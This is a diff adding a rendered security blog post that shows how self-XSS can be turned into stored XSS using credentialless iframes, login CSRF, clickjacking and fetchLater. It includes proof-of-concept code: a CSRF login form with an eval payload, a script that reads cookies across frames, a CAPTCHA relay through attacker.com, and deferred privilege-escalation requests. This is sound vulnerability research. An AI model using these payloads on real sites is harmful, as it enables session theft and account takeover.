@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Make Self-XSS Great Again - Slonser Notes</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="
+Disclaimer: This article is intended for security professionals conducting authorized testing within the scope of a contract. The author is not responsible for any damage caused by the application of the provided information. The distribution of malicious programs, disruption of system operation, and violation of the confidentiality of correspondence are pursued by law.
+
+Introduction
+Many security researchers are familiar with the frustrating experience of discovering an XSS vulnerability that requires complex actions within an account, effectively making it only reproducible on the attacker&rsquo;s account and thus losing its practical value. Many bug bounty hunters have likely received responses like this from triage teams:" />
+	<meta property="og:image" content=""/>
+	<meta property="og:url" content="//localhost:1313/posts/make-self-xss-great-again/">
+  <meta property="og:site_name" content="Slonser Notes">
+  <meta property="og:title" content="Make Self-XSS Great Again">
+  <meta property="og:description" content="Disclaimer: This article is intended for security professionals conducting authorized testing within the scope of a contract. The author is not responsible for any damage caused by the application of the provided information. The distribution of malicious programs, disruption of system operation, and violation of the confidentiality of correspondence are pursued by law.
+Introduction Many security researchers are familiar with the frustrating experience of discovering an XSS vulnerability that requires complex actions within an account, effectively making it only reproducible on the attacker’s account and thus losing its practical value. Many bug bounty hunters have likely received responses like this from triage teams:">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-06-13T00:00:00+03:00">
+    <meta property="article:modified_time" content="2025-06-13T00:00:00+03:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Make Self-XSS Great Again">
+  <meta name="twitter:description" content="Disclaimer: This article is intended for security professionals conducting authorized testing within the scope of a contract. The author is not responsible for any damage caused by the application of the provided information. The distribution of malicious programs, disruption of system operation, and violation of the confidentiality of correspondence are pursued by law.
+Introduction Many security researchers are familiar with the frustrating experience of discovering an XSS vulnerability that requires complex actions within an account, effectively making it only reproducible on the attacker’s account and thus losing its practical value. Many bug bounty hunters have likely received responses like this from triage teams:">
+
+        <link href="//localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="//localhost:1313/css/main.6a0f23ea50fd34b46fee262a5a68e17d458c51a2bc99ba1ba018065de6b180c3.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="//localhost:1313/css/dark.50b57e12d401420df23965fed157368aba37b76df0ecefd0b1ecd4da664f01a0.css" media="(prefers-color-scheme: dark)"  />
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="//localhost:1313/">Slonser Notes</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/posts/who-am-i/">About</a>
+		
+		<a href="/tags">Tags</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+  <article>
+    <div class="post-container">
+      
+      <div class="post-content">
+        <div class="title">
+          <h1 class="title">Make Self-XSS Great Again</h1>
+          <div class="meta">Posted on Jun 13, 2025</div>
+        </div>
+        
+        <section class="body">
+          <blockquote>
+<p><strong>Disclaimer</strong>: This article is intended for security professionals conducting authorized testing within the scope of a contract. The author is not responsible for any damage caused by the application of the provided information. The distribution of malicious programs, disruption of system operation, and violation of the confidentiality of correspondence are pursued by law.</p>
+</blockquote>
+<h1 id="introduction">Introduction</h1>
+<p>Many security researchers are familiar with the frustrating experience of discovering an XSS vulnerability that requires complex actions within an account, effectively making it only reproducible on the attacker&rsquo;s account and thus losing its practical value. Many bug bounty hunters have likely received responses like this from triage teams:</p>
+<p><img src="./1.png" alt=""></p>
+<p>The purpose of this article is to demonstrate that what is commonly perceived as <code>Stored Self-XSS</code> can actually be transformed into a regular <code>Stored XSS</code> using modern browser capabilities.</p>
+<h1 id="the-credentialless-era">The Credentialless Era</h1>
+<p>The key challenge with such vulnerabilities presents the following dilemma:</p>
+<ol>
+<li>To execute a useful XSS payload, we need to be logged into the attacker&rsquo;s account</li>
+<li>If we log into the attacker&rsquo;s account, the attack loses its purpose since we&rsquo;ll be in the attacker&rsquo;s session and lose access to the original session</li>
+</ol>
+<p>However, this approach is outdated, and the reason for this is <a href="https://developer.mozilla.org/en-US/docs/Web/Security/IFrame_credentialless">credentialless iframe</a></p>
+<blockquote>
+<p>This results in the documents inside the credentialless <code>&lt;iframe&gt;</code> being loaded using new, ephemeral contexts — those contexts don&rsquo;t have access to the data associated with their origins</p>
+</blockquote>
+<p>In practice, this means that if we open an HTML page with this content:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://victim.domain/&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;40%&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;500px&#34;</span> <span style="color:#a6e22e">credentialless</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://victim.domain/&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;40%&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;500px&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span></code></pre></div><p>We will see that the first iframe won&rsquo;t have the victim&rsquo;s session, while the second one will:
+<img src="./2.png" alt=""></p>
+<p>However, this functionality is poorly documented, and the phrase <code>those contexts don't have access to the data associated with their origins</code> can be misleading.</p>
+<p>Looking at the <a href="https://wicg.github.io/anonymous-iframe/#alternatives-opaque-origins">RFC</a>, we can see that credentialless iframes are same-origin with regular iframes (It&rsquo;s mentioned that implementing opaque-origins similar to sandbox domains wasn&rsquo;t implemented due to implementation difficulties):</p>
+<blockquote>
+<p>The credentialless iframes model that we propose relies on partitioned storage (see explainer), using a nonce in the storage key. We have also considered attributing opaque origins to the credentialless iframes, similar to sandboxed iframes. This would ensure that the credentialless iframes do not have access to existing credentials and shared storage since their origin has been changed to an opaque one.</p>
+<p>This solution runs into compatibility issues:</p>
+<p>&hellip;</p>
+</blockquote>
+<h1 id="the-credentialless-same-origin-issue">The Credentialless Same-Origin Issue</h1>
+<p>What does it mean for us that credentialless iframes are same-origin with regular iframes?</p>
+<p>Let&rsquo;s consider the following page:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://neplox.security/xss_page_url&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;20%&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;20%&#34;</span> <span style="color:#a6e22e">credentialless</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://neplox.security/&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span></code></pre></div><p>The fact is that if <code>/xss</code> executes the following code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>window.<span style="color:#a6e22e">top</span>[<span style="color:#ae81ff">1</span>].document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Hi from credentialless&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">alert</span>(window.<span style="color:#a6e22e">top</span>[<span style="color:#ae81ff">1</span>].document.<span style="color:#a6e22e">cookie</span>);
+</span></span></code></pre></div><p>It will gain access to the original cookies of the page:
+<img src="./3.png" alt=""></p>
+<h1 id="self-xss--csrf-on-login">SELF-XSS + CSRF on Login</h1>
+<p>Let&rsquo;s say you&rsquo;ve found a Stored SELF-XSS. One real example from my experience looked like this:
+<img src="./4.png" alt=""></p>
+<p>The home page displayed a message <code>Welcome, username!</code>, where the username wasn&rsquo;t sanitized, allowing for any XSS payload to be inserted. This is a classic example of Self-XSS.</p>
+<p>After this, it&rsquo;s worth examining the <code>/login</code> form. If it lacks CSRF protection, you can do the following:
+<img src="./9.png" alt=""></p>
+<ol>
+<li>Create a classic CSRF login form:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://victim.domain/login&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;attacker_username&lt;img src=x onerror=eval(window.name)&gt;&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Super_s@fe_password&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Submit request&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">forms</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">submit</span>();
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><ol start="2">
+<li>Direct the target to the following page:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;window.top[1].document.body.innerHTML = &#39;edited by slonser&lt;/br&gt;&#39; + &#39;Our cookie is: &#39; + document.cookie + &#39;\nVictim cookie is: &#39; + window.top[1].document.cookie;&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;./logi-csrf-poc.html&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;40%&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;500px&#34;</span> <span style="color:#a6e22e">credentialless</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://localhost:3004/&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;40%&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;500px&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span></code></pre></div><ol start="3">
+<li>(Optional) Redirect the user in the credentialless iframe to a URL that triggers the SELF-XSS, which will then execute the desired actions (session theft/ATO) within <code>window.top[1]</code>. Here, it&rsquo;s useful to note that all credentialless frames within one document share the same context. If you already have <code>&lt;iframe src=//example.com credentialless&gt;</code> on the page that has set cookies and localStorage, adding <code>&lt;iframe src=//example.com/path1 credentialless&gt;</code> will have access to the same storage data as the first credentialless frame.</li>
+</ol>
+<p>In our case, it would look something like this:
+<img src="./8.png" alt=""></p>
+<p>As we can see, we successfully got both cookie values (attacker&rsquo;s and victim&rsquo;s). To execute actions within the frame with the victim&rsquo;s credentials, simply call <code>window.top[1].eval('your code')</code></p>
+<h1 id="self-xss--csrf-on-login-with-captcha">SELF-XSS + CSRF on Login with Captcha</h1>
+<p>Sometimes you might encounter a situation where the login form lacks CSRF protection but has a CAPTCHA. This situation doesn&rsquo;t significantly complicate the exploit. The key point here is that CAPTCHA is not a CSRF protection mechanism, as there&rsquo;s no guarantee that the CAPTCHA was solved on the same device where it was submitted.</p>
+<p>In such cases, you can simply add a CAPTCHA retrieval step to the attack from the previous section. Here&rsquo;s a simple client-side implementation:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ws</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebSocket</span>(<span style="color:#e6db74">&#39;ws://attacker.com:3004&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">onopen</span> <span style="color:#f92672">=</span> () =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({ <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;visited&#39;</span> }));
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">onmessage</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">event</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">data</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">type</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;captcha&#39;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">captchaInput</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">captchaToken</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>And on the server side:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">WebSocket</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;ws&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">readline</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;readline&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">wss</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebSocket</span>.<span style="color:#a6e22e">Server</span>({ <span style="color:#a6e22e">port</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">3004</span> });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">rl</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">readline</span>.<span style="color:#a6e22e">createInterface</span>({
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">input</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">stdin</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">output</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">stdout</span>
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;WebSocket server is running on port 3004&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">wss</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;connection&#39;</span>, (<span style="color:#a6e22e">ws</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;New client connected&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;message&#39;</span>, (<span style="color:#a6e22e">message</span>) =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">message</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">type</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;visited&#39;</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;Client sent visited message&#39;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rl</span>.<span style="color:#a6e22e">question</span>(<span style="color:#e6db74">&#39;Enter captcha token: &#39;</span>, (<span style="color:#a6e22e">token</span>) =&gt; {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;captcha&#39;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">captchaToken</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">token</span>
+</span></span><span style="display:flex;"><span>                }));
+</span></span><span style="display:flex;"><span>            });
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;close&#39;</span>, () =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;Client disconnected&#39;</span>);
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>}); 
+</span></span></code></pre></div><p>This is a simple example where when a user visits the site, we&rsquo;ll receive a request and need to enter the CAPTCHA token in the console (For example, by manually intercepting it through a proxy). Obviously, for real attacks, you can implement more complex logic - this is just for demonstrating one possible implementation approach.</p>
+<h1 id="self-xss--clickjacking">SELF-XSS + Clickjacking</h1>
+<p>If login CSRF is not available, we can use Clickjacking instead.
+The main idea seems quite amusing - using clickjacking, we need to make the user enter attacker credentials in the login form (This is actually the complete opposite of classic vectors where people try to use social engineering to make users enter data in the attacker&rsquo;s form)</p>
+<p>While I&rsquo;m not an expert in such techniques, it might look something like this:</p>
+<ol>
+<li>
+<p>The user visits the attacker&rsquo;s site and requests access
+<img src="./6.png" alt=""></p>
+</li>
+<li>
+<p>The user receives an email with content like this:
+<img src="./7.png" alt=""></p>
+</li>
+<li>
+<p>The user goes to the attacker&rsquo;s site and logs in with these credentials, but instead of entering data in the form on the attacker&rsquo;s site, they&rsquo;ll be entering data in the form on <code>victim.com</code>. (Simply insert a credentialless form with an overlay from your site. Describing how to implement Clickjacking is not part of this article)</p>
+</li>
+</ol>
+<p>It&rsquo;s worth noting that everything will look valid to the user, as they&rsquo;ll be entering data that was sent to them from <code>attacker.com</code> on the same site. An average user is unlikely to realize that the attacker is currently using clickjacking to direct them to their account for the attack.</p>
+<h1 id="x-frame-options-deny">X-Frame-Options: Deny</h1>
+<blockquote>
+<p>Note: fetchLater is intended to send requests after the page is closed, but I&rsquo;m not sure how I managed to make it work after page closure while writing this article. If I figure it out, I will update the article.</p>
+</blockquote>
+<p>As you may have noticed, the techniques described above have one drawback - they will only work if we can place the target site in an iframe. But what can we do if <code>X-Frame-Options: Deny</code> is specified?</p>
+<p>Actually, another new API that became available in spring 2025 can help us here - <a href="https://developer.mozilla.org/en-US/docs/Web/API/fetchLater_API">fetchLater</a></p>
+<blockquote>
+<p>The fetchLater() API provides an interface to request a deferred fetch that can be sent after a specified period of time, or when the page is closed or navigated away from.</p>
+</blockquote>
+<p>In simple terms, this means we can now send requests after some time, even if the tab is already closed.
+This opens up the possibility to send a request with the actual cookies at the time of sending, even if they have changed.
+When might this be useful? This can be useful when we have a Self-XSS and we can elevate our privileges / perform ATO through a series of requests.
+It looks like this:
+<img src="./10.png" alt=""></p>
+<ol>
+<li>Open the page with csrf-login - <code>window.open('https://victim.domain/csrf')</code></li>
+<li>From the window where you triggered the Self-XSS, register several fetchLater requests for different time intervals</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">req</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Request</span>(<span style="color:#e6db74">&#34;/change_rights&#34;</span>,{<span style="color:#a6e22e">method</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;POST&#34;</span>,<span style="color:#a6e22e">body</span><span style="color:#f92672">:</span><span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({<span style="color:#a6e22e">username</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;victim&#34;</span>, <span style="color:#a6e22e">rights</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;admin&#34;</span>}),<span style="color:#a6e22e">credentials</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;include&#34;</span>})
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">delay_req</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Request</span>(<span style="color:#e6db74">&#34;http://localhost:8095&#34;</span>,{<span style="color:#a6e22e">method</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;GET&#34;</span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span><span style="color:#ae81ff">19</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fetchLater</span>(<span style="color:#a6e22e">delay_req</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fetchLater</span>(<span style="color:#a6e22e">req</span>,{<span style="color:#a6e22e">activateAfter</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">timeout</span>})
+</span></span></code></pre></div><ol>
+<li>Log out of the attacker&rsquo;s account</li>
+</ol>
+<p>When the user visits the site we&rsquo;re attacking next time and logs in again - after some time, the request that was formed by the attacker will be executed on their behalf, but with the current cookies. It&rsquo;s important to mention again that the victim should not visit the attacker&rsquo;s site again, as this request will already be in the background queue.</p>
+<h1 id="conclusion">Conclusion</h1>
+<p>In modern browsers, thanks to credentialless frames, any Stored Self-XSS can be transformed into a regular XSS. However, this will often still require minimal user interaction.</p>
+<h1 id="references">References</h1>
+<ol>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/Security/IFrame_credentialless">Credentialless iframe documentation</a></li>
+<li><a href="https://wicg.github.io/anonymous-iframe/#alternatives-opaque-origins">Anonymous iframe RFC</a></li>
+</ol>
+
+        </section>
+        <div class="post-tags">
+          
+          
+          
+        </div>
+      </div>
+
+      
+      
+    </div>
+
+    </article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/Slonser" rel="me" title="GitHub"><svg class="feather">
+   <use href="/svg/feather-sprite.51cf5647cb1987f769b616558f2620fd9423d72058490231b391bf6aa3744b55.svg#github" />
+</svg></a><a class="border"></a><a class="soc" href="https://twitter.com/slonser_" rel="me" title="Twitter"><svg class="feather">
+   <use href="/svg/feather-sprite.51cf5647cb1987f769b616558f2620fd9423d72058490231b391bf6aa3744b55.svg#twitter" />
+</svg></a><a class="border"></a><a class="soc" href="https://t.me/Slonser" rel="me" title="Telegram"><svg class="feather">
+   <use href="/svg/feather-sprite.51cf5647cb1987f769b616558f2620fd9423d72058490231b391bf6aa3744b55.svg#telegram" />
+</svg></a><a class="border"></a></div>
+  <div class="footer-info">
+    2026  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+
+</div>
+    </body>
+</html>
